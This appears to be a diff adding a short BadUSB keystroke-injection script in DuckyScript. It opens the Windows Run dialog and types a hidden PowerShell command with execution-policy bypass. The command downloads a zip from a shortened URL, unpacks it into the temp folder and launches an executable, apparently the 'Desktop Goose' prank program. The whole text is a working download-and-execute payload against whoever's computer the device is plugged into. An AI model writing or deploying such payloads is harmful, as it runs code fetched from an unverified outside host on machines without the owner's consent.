@@ -1,0 +1,4 @@
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'shorturl.at/wxC18' -O "$D\g.zip";Expand-Archive "$D\g.zip" -Des $D -Force;Start-Process "$D\g\Goose\Goose\GooseDesktop.exe"
+ENTER
